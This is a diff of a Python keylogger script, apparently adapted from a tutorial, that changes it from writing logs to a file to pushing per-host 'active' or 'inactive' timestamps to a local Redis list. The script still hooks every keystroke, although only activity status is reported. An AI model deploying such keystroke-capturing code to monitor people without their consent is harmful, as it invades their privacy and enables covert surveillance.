@@ -1,4 +1,5 @@
 import redis
+import socket
 import keyboard
 from threading import Timer
 from datetime import datetime
@@ -6,12 +7,12 @@ from datetime import datetime
 SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
 
 redis = redis.Redis('localhost')
+hostname = socket.gethostname()
 
 class Keylogger:
-    def __init__(self, interval, report_method="print"):
+    def __init__(self, interval):
         # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval
-        self.report_method = report_method
         # this is the string variable that contains the log of all 
         # the keystrokes within `self.interval`
         self.log = ""
@@ -43,23 +44,11 @@ class Keylogger:
         # finally, add the key name to our global `self.log` variable
         self.log += name
 
-    def update_filename(self):
-        # construct the filename to be identified by start & end datetimes
-        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
-        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
-        self.filename = f"keylog"
-
-    def report_to_file(self):
-        """This method creates a log file in the current directory that contains
-        the current keylogs in the `self.log` variable"""
-        # open the file in write mode (create it)
-        with open(f"{self.filename}.txt", "a+") as f:
-            # write the keylogs to the file
-            if (self.log != ''):
-                redis.rpush('activity', f'{datetime.now().__str__()} - active')
-                
-            else:
-                redis.rpush('activity', f'{datetime.now().__str__()} - inactive')
+    def send_to_redis(self):
+        if (self.log != ''):
+            redis.rpush('activity', f' Host: {hostname} - {datetime.now().__str__()} - active')           
+        else:
+            redis.rpush('activity', f' Host: {hostname} - {datetime.now().__str__()} - inactive')
                 
     def report(self):
         """
@@ -69,8 +58,8 @@ class Keylogger:
         # if there is something in log, report it
         self.end_dt = datetime.now()
         # update `self.filename`
-        self.update_filename()      
-        self.report_to_file()
+        # self.update_filename()      
+        self.send_to_redis()
         # if you don't want to print in the console, comment below line
         self.start_dt = datetime.now()
         self.log = ""
@@ -96,5 +85,5 @@ if __name__ == "__main__":
     # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
     # if you want a keylogger to record keylogs to a local file 
     # (and then send it using your favorite method)
-    keylogger = Keylogger(interval=5, report_method="file")
+    keylogger = Keylogger(interval=10)
     keylogger.start()
